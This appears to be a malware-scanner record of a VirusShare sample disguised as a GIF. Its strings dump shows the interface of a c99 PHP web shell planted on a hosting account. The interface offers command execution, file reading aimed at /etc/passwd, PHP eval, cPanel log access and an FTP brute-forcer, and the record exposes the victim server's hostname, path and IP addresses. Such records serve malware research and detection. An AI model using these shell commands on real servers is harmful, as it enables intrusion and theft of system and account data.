type=submit name=submit value=\"Execute\"></div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n  <center><br/><b>:: Kernel Info :: </b>\n<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09\nEST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>\n</center>\n    </td>\n</tr></TABLE><br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\">Php Safe-Mode Bypass (Read Files)\n    </div><br>\n    <form action=\"?\">\n      <div align=\"center\">\n      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>\n      \n      \n      \n           \n      \n      \n      \t\n\t\n          <br>\n      </div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">\n      <div align=\"center\"><br>\n      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>\n\n    </form></center>\n    </td>\n</tr></TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>\n</td>\n</tr>\n</TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0157 ]--</p></td></tr></table>\n<br/></body></html>"
    },
    "filename": "VirusShare_01314ffa371176bfb965937e74883db2",
    "filesize": 150442,
    "filetype": "GIF image data 3425 x 15370",
    "hashes": {
        "md5": "01314ffa371176bfb965937e74883db2",
        "sha1": "dd8caf946300be84e9bfea871991ea94db0d22d2",
        "sha256": "f80929a38ebef6b4cfb3dab3d4458f48381709e56aa52723f10cc2dba92ff979"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "GIF89;a",
            "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fhome%2F&sort=0a\"><b>home/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2F&sort=0a\"><b>chsclair/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2F&sort=0a\"><b>public_html/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F&sort=0a\"><b>thickbox/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=green>drwxr-xr-x</font></b><br><b>Free 240.23 GB of 389.31 GB (61.71%)</b><br><b>Your ip: <a href=http://87.177.180.196>87.177.180.196</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[js]&nbsp;jquery-latest.js (93.62 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=green>-rw-r--r--</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=jquery-latest.js&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b><u>[hex]</u></b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=info&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=html&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=html&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=txt&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><font color=green>[txt]</font></a> (<a href=\"?act=f&f=jquery-latest.js&ft=txt&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=code&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=code&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=phpsess&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=phpsess&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=exe&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=exe&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=sdb&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=sdb&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=img&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=img&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=ini&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=ini&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=download&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=download&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=notepad&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=notepad&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=edit&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=edit&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> /home/chsclair/public_html/thickbox/jquery-latest.js</td></tr><tr><td><b>Size</b></td><td> 93.62 KB</td></tr><tr><td><b>MD5</b></td><td> 807aac0afa686d7558985eb4840af075</td></tr><tr><td><b>Owner/Group</b></td><td> chsclair/chsclair<tr><td><b>Perms</b></td><td><a href=\"?act=chmod&f=jquery-latest.js&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><font color=green>-rw-r--r--</font></a></td></tr><tr><td><b>Create time</b></td><td> 26/01/2011 08:25:58</td></tr><tr><td><b>Access time</b></td><td> 07/06/2011 01:36:12</td></tr><tr><td><b>MODIFY time</b></td><td> 04/03/2010 17:21:10</td></tr></table><br><b>HEXDUMP PREVIEW</b><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>00000000<br>00000018<br>00000030<br>00000048<br>00000060<br>00000078<br>00000090<br>000000A8<br></td><td bgcolor=000000>28 66 75 6E 63 74 69 6F 6E 28 29 7B 0A 2F 2A 0A 20 2A 20 6A 51 75 65 72 <br>79 20 31 2E 32 2E 33 61 20 2D 20 4E 65 77 20 57 61 76 65 20 4A 61 76 61 <br>73 63 72 69 70 74 0A 20 2A 0A 20 2A 20 43 6F 70 79 72 69 67 68 74 20 28 <br>63 29 20 32 30 30 37 20 4A 6F 68 6E 20 52 65 73 69 67 20 28 6A 71 75 65 <br>72 79 2E 63 6F 6D 29 0A 20 2A 20 44 75 61 6C 20 6C 69 63 65 6E 73 65 64 <br>20 75 6E 64 65 72 20 74 68 65 20 4D 49 54 20 28 4D 49 54 2D 4C 49 43 45 <br>4E 53 45 2E 74 78 74 29 0A 20 2A 20 61 6E 64 20 47 50 4C 20 28 47 50 4C <br>2D 4C 49 43 45 4E 53 45 2E 74 78 74 29 20 6C 69 63 65 6E 73 65 73 2E 0A <br></td><td bgcolor=000000>(function(){&nbsp;/*&nbsp;&nbsp;*&nbsp;jQuer<br>y&nbsp;1.2.3a&nbsp;-&nbsp;New&nbsp;Wave&nbsp;Java<br>script&nbsp;&nbsp;*&nbsp;&nbsp;*&nbsp;Copyright&nbsp;(<br>c)&nbsp;2007&nbsp;John&nbsp;Resig&nbsp;(jque<br>ry.com)&nbsp;&nbsp;*&nbsp;Dual&nbsp;licensed<br>&nbsp;under&nbsp;the&nbsp;MIT&nbsp;(MIT-LICE<br>NSE.txt)&nbsp;&nbsp;*&nbsp;and&nbsp;GPL&nbsp;(GPL<br>-LICENSE.txt)&nbsp;licenses.&nbsp;<br></td></tr></table><br><b>Base64 Encode</b><br><textarea cols=80 rows=10>KGZ1bmN0aW9uKCl7Ci8qCiAqIGpRdWVyeSAxLjIuM2EgLSBOZXcgV2F2ZSBKYXZhc2NyaXB0CiAqCiAqIENvcHlyaWdodCAoYykgMjAwNyBKb2huIFJlc2lnIChqcXVlcnkuY29tKQogKiBEdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSBNSVQgKE1JVC1MSUNFTlNFLnR4dCkKICogYW5kIEdQTCAoR1BMLUxJQ0VOU0UudHh0KSBsaWNlbnNlcy4KICoKICogJERhdGU6IDIwMDgtMDEtMjggMTE6Mzc6NDYgLTA4MDAgKE1vbiwgMjggSmFuIDIwMDgpICQKICogJFJldjogNDU1MCAkCiAqLwoKLy8gTWFwIG92ZXIgalF1ZXJ5IGluIGNhc2Ugb2Ygb3ZlcndyaXRlCmlmICggd2luZG93LmpRdWVyeSApCgl2YXIgX2pRdWVyeSA9IHdpbmRvdy5qUXVlcnk7Cgp2YXIgalF1ZXJ5ID0gd2luZG93LmpRdWVyeSA9IGZ1bmN0aW9uKCBzZWxlY3RvciwgY29udGV4dCApIHsKCS8vIFRoZSBqUXVlcnkgb2JqZWN0IGlzIGFjdHVhbGx5IGp1c3QgdGhlIGluaXQgY29uc3RydWN0b3IgJ2VuaGFuY2VkJwoJcmV0dXJuIG5ldyBqUXVlcnkucHJvdG90eXBlLmluaXQoIHNlbGVjdG9yLCBjb250ZXh0ICk7Cn07CgovLyBNYXAgb3ZlciB0aGUgJCBpbiBjYXNlIG9mIG92ZXJ3cml0ZQppZiAoIHdpbmRvdy4kICkKCXZhciBfJCA9IHdpbmRvdy4kOwoJCi8vIE1hcCB0aGUgalF1ZXJ5IG5hbWVzcGFjZSB0byB0aGUgJyQnIG9uZQp3aW5kb3cuJCA9IGpRdWVyeTsKCi8vIEEgc2ltcGxlIHdheSB0byBjaGVjayBmb3IgSFRNTCBzdHJpbmdzIG9yIElEIHN0cmluZ3MKLy8gKGJvdGggb2Ygd2hpY2ggd2Ugb3B0aW1pemUgZm9yKQp2YXIgcXVpY2tFeHByID0gL15bXjxdKig8KC58XHMpKz4pW14+XSokfF4jKFx3KykkLzsKCi8vIElzIGl0IGEgc2ltcGxlIHNlbGVjdG9yCnZhciBpc1NpbXBsZSA9IC9eLlteOiNcW1wuXSokLzsKCmpRdWVyeS5mbiA9IGpRdWVyeS5wcm90b3R5cGUgPSB7Cglpbml0OiBmdW5jdGlvbiggc2VsZWN0b3IsIGNvbnRleHQgKSB7CgkJLy8gTWFrZSBzdXJlIHRoYXQgYSBzZWxlY3Rpb24gd2FzIHByb3ZpZGVkCgkJc2VsZWN0b3IgPSBzZWxlY3RvciB8fCBkb2N1bWVudDsKCgkJLy8gSGFuZGxlICQoRE9NRWxlbWVudCkKCQlpZiAoIHNlbGVjdG9yLm5vZGVUeXBlICkgewoJCQl0aGlzWzBdID0gc2VsZWN0b3I7CgkJCXRoaXMubGVuZ3RoID0gMTsKCQkJcmV0dXJuIHRoaXM7CgoJCS8vIEhhbmRsZSBIVE1MIHN0cmluZ3MKCQl9IGVsc2UgaWYgKCB0eXBlb2Ygc2VsZWN0b3IgPT0gInN0cmluZyIgKSB7CgkJCS8vIEFyZSB3ZSBkZWFsaW5nIHdpdGggSFRNTCBzdHJpbmcgb3IgYW4gSUQ/CgkJCXZhciBtYXRjaCA9IHF1aWNrRXhwci5leGVjKCBzZWxlY3RvciApOwoKCQkJLy8gVmVyaWZ5IGEgbWF0Y2gsIGFuZCB0aGF0IG5vIGNvbnRleHQgd2FzIHNwZWNpZmllZCBmb3IgI2lkCgkJCWlmICggbWF0Y2ggJiYgKG1hdGNoWzFdIHx8ICFjb250ZXh0KSApIHsKCgkJCQkvLyBIQU5ETEU6ICQoaHRtbCkgLT4gJChhcnJheSkKCQkJCWlmICggbWF0Y2hbMV0gKQoJCQkJCXNlbGVjdG9yID0galF1ZXJ5LmNsZWFuKCBbIG1hdGNoWzFdIF0sIGNvbnRleHQgKTsKCgkJCQkvLyBIQU5ETEU6ICQoIiNpZCIpCgkJCQllbHNlIHsKCQkJCQl2YXIgZWxlbSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCBtYXRjaFszXSApOwoKCQkJCQkvLyBNYWtlIHN1cmUgYW4gZWxlbWVudCB3YXMgbG9jYXRlZAoJCQkJCWlmICggZWxlbSApCgkJCQkJCS8vIEhhbmRsZSB0aGUgY2FzZSB3aGVyZSBJRSBhbmQgT3BlcmEgcmV0dXJuIGl0ZW1zCgkJCQkJCS8vIGJ5IG5hbWUgaW5zdGVhZCBvZiBJRAoJCQkJCQlpZiAoIGVsZW0uaWQgIT0gbWF0Y2hbM10gKQoJCQkJCQkJcmV0dXJuIGpRdWVyeSgpLmZpbmQoIHNlbGVjdG9yICk7CgoJCQkJCQkvLyBPdGhlcndpc2UsIHdlIGluamVjdCB0aGUgZWxlbWVudCBkaXJlY3RseSBpbnRvIHRoZSBqUXVlcnkgb2JqZWN0CgkJCQkJCWVsc2UgewoJCQkJCQkJdGhpc1swXSA9IGVsZW07CgkJCQkJCQl0aGlzLmxlbmd0aCA9IDE7CgkJCQkJCQlyZXR1cm4gdGhpczsKCQkJCQkJfQoKCQkJCQllbHNlCgkJCQkJCXNlbGVjdG9yID0gW107CgkJCQl9CgoJCQkvLyBIQU5ETEU6ICQoZXhwciwgW2NvbnRleHRdKQoJCQkvLyAod2hpY2ggaXMganVzdCBlcXVpdmFsZW50IHRvOiAkKGNvbnRlbnQpLmZpbmQoZXhwcikKCQkJfSBlbHNlCgkJCQlyZXR1cm4gbmV3IGpRdWVyeSggY29udGV4dCApLmZpbmQoIHNlbGVjdG9yICk7CgoJCS8vIEhBTkRMRTogJChmdW5jdGlvbikKCQkvLyBTaG9ydGN1dCBmb3IgZG9jdW1lbnQgcmVhZHkKCQl9IGVsc2UgaWYgKCBqUXVlcnkuaXNGdW5jdGlvbiggc2VsZWN0b3IgKSApCgkJCXJldHVybiBuZXcgalF1ZXJ5KCBkb2N1bWVudCApWyBqUXVlcnkuZm4ucmVhZHkgPyAicmVhZHkiIDogImxvYWQiIF0oIHNlbGVjdG9yICk7CgoJCXJldHVybiB0aGlzLnNldEFycmF5KAoJCQkvLyBIQU5ETEU6ICQoYXJyYXkpCgkJCXNlbGVjdG9yLmNvbnN0cnVjdG9yID09IEFycmF5ICYmIHNlbGVjdG9yIHx8CgoJCQkvLyBIQU5ETEU6ICQoYXJyYXlsaWtlKQoJCQkvLyBXYXRjaCBmb3Igd2hlbiBhbiBhcnJheS1saWtlIG9iamVjdCwgY29udGFpbnMgRE9NIG5vZGVzLCBpcyBwYXNzZWQgaW4gYXMgdGhlIHNlbGVjdG9yCgkJCShzZWxlY3Rvci5qcXVlcnkgfHwgc2VsZWN0b3IubGVuZ3RoICYmIHNlbGVjdG9yICE9IHdpbmRvdyAmJiAhc2VsZWN0b3Iubm9kZVR5cGUgJiYgc2VsZWN0b3JbMF0gIT0gdW5kZWZpbmVkICYmIHNlbGVjdG9yWzBdLm5vZGVUeXBlKSAmJiBqUXVlcnkubWFrZUFycmF5KCBzZWxlY3RvciApIHx8CgoJCQkvLyBIQU5ETEU6ICQoKikKCQkJWyBzZWxlY3RvciBdICk7Cgl9LAoJCgkvLyBUaGUgY3VycmVudCB2ZXJzaW9uIG9mIGpRdWVyeSBiZWluZyB1c2VkCglqcXVlcnk6ICIxLjIuM2EiLAoKCS8vIFRoZSBudW1iZXIgb2YgZWxlbWVudHMgY29udGFpbmVkIGluIHRoZSBtYXRjaGVkIGVsZW1lbnQgc2V0CglzaXplOiBmdW5jdGlvbigpIHsKCQlyZXR1cm4gdGhpcy5sZW5ndGg7Cgl9LAoJCgkvLyBUaGUgbnVtYmVyIG9mIGVsZW1lbnRzIGNvbnRhaW5lZCBpbiB0aGUgbWF0Y2hlZCBlbGVtZW50IHNldAoJbGVuZ3RoOiAwLAoKCS8vIEdldCB0aGUgTnRoIGVsZW1lbnQgaW4gdGhlIG1hdGNoZWQgZWxlbWVudCBzZXQgT1IKCS8vIEdldCB0aGUgd2hvbGUgbWF0Y2hlZCBlbGVtZW50IHNldCBhcyBhIGNsZWFuIGFycmF5CglnZXQ6IGZ1bmN0aW9uKCBudW0gKSB7CgkJcmV0dXJuIG51bSA9PSB1bmRlZmluZWQgPwoKCQkJLy8gUmV0dXJuIGEgJ2NsZWFuJyBhcnJheQoJCQlqUXVlcnkubWFrZUFycmF5KCB0aGlzICkgOgoKCQkJLy8gUmV0dXJuIGp1c3QgdGhlIG9iamVjdAoJCQl0aGlzWyBudW0gXTsKCX0sCgkKCS8vIFRha2UgYW4gYXJyYXkgb2YgZWxlbWVudHMgYW5kIHB1c2ggaXQgb250byB0aGUgc3RhY2sKCS8vIChyZXR1cm5pbmcgdGhlIG5ldyBtYXRjaGVkIGVsZW1lbnQgc2V0KQoJcHVzaFN0YWNrOiBmdW5jdGlvbiggZWxlbXMgKSB7CgkJLy8gQnVpbGQgYSBuZXcgalF1ZXJ5IG1hdGNoZWQgZWxlbWVudCBzZXQKCQl2YXIgcmV0ID0galF1ZXJ5KCBlbGVtcyApOwoKCQkvLyBBZGQgdGhlIG9sZCBvYmplY3Qgb250byB0aGUgc3RhY2sgKGFzIGEgcmVmZXJlbmNlKQoJCXJldC5wcmV2T2JqZWN0ID0gdGhpczsKCgkJLy8gUmV0dXJuIHRoZSBuZXdseS1mb3JtZWQgZWxlbWVudCBzZXQKCQlyZXR1cm4gcmV0OwoJfSwKCQoJLy8gRm9yY2UgdGhlIGN1cnJlbnQgbWF0Y2hlZCBzZXQgb2YgZWxlbWVudHMgdG8gYmVjb21lCgkvLyB0aGUgc3BlY2lmaWVkIGFycmF5IG9mIGVsZW1lbnRzIChkZXN0cm95aW5nIHRoZSBzdGFjayBpbiB0aGUgcHJvY2VzcykKCS8vIFlvdSBzaG91bGQgdXNlIHB1c2hTdGFjaygpIGluIG9yZGVyIHRvIGRvIHRoaXMsIGJ1dCBtYWludGFpbiB0aGUgc3RhY2sKCXNldEFycmF5OiBmdW5jdGlvbiggZWxlbXMgKSB7CgkJLy8gUmVzZXR0aW5nIHRoZSBsZW5ndGggdG8gMCwgdGhlbiB1c2luZyB0aGUgbmF0aXZlIEFycmF5IHB1c2gKCQkvLyBpcyBhIHN1cGVyLWZhc3Qgd2F5IHRvIHBvcHVsYXRlIGFuIG9iamVjdCB3aXRoIGFycmF5LWxpa2UgcHJvcGVydGllcwoJCXRoaXMubGVuZ3RoID0gMDsKCQlBcnJheS5wcm90b3R5cGUucHVzaC5hcHBseSggdGhpcywgZWxlbXMgKTsKCQkKCQlyZXR1cm4gdGhpczsKCX0sCgoJLy8gRXhlY3V0ZSBhIGNhbGxiYWNrIGZvciBldmVyeSBlbGVtZW50IGluIHRoZSBtYXRjaGVkIHNldC4KCS8vIChZb3UgY2FuIHNlZWQgdGhlIGFyZ3VtZW50cyB3aXRoIGFuIGFycmF5IG9mIGFyZ3MsIGJ1dCB0aGlzIGlzCgkvLyBvbmx5IHVzZWQgaW50ZXJuYWxseS4pCgllYWNoOiBmdW5jdGlvbiggY2FsbGJhY2ssIGFyZ3MgKSB7CgkJcmV0dXJuIGpRdWVyeS5lYWNoKCB0aGlzLCBjYWxsYmFjaywgYXJncyApOwoJfSwKCgkvLyBEZXRlcm1pbmUgdGhlIHBvc2l0aW9uIG9mIGFuIGVsZW1lbnQgd2l0aGluIAoJLy8gdGhlIG1hdGNoZWQgc2V0IG9mIGVsZW1lbnRzCglpbmRleDogZnVuY3Rpb24oIGVsZW0gKSB7CgkJdmFyIHJldCA9IC0xOwoKCQkvLyBMb2NhdGUgdGhlIHBvc2l0aW9uIG9mIHRoZSBkZXNpcmVkIGVsZW1lbnQKCQl0aGlzLmVhY2goZnVuY3Rpb24oaSl7CgkJCWlmICggdGhpcyA9PSBlbGVtICkKCQkJCXJldCA9IGk7CgkJfSk7CgoJCXJldHVybiByZXQ7Cgl9LAoKCWF0dHI6IGZ1bmN0aW9uKCBuYW1lLCB2YWx1ZSwgdHlwZSApIHsKCQl2YXIgb3B0aW9ucyA9IG5hbWU7CgkJCgkJLy8gTG9vayBmb3IgdGhlIGNhc2Ugd2hlcmUgd2UncmUgYWNjZXNzaW5nIGEgc3R5bGUgdmFsdWUKCQlpZiAoIG5hbWUuY29uc3RydWN0b3IgPT0gU3RyaW5nICkKCQkJaWYgKCB2YWx1ZSA9PSB1bmRl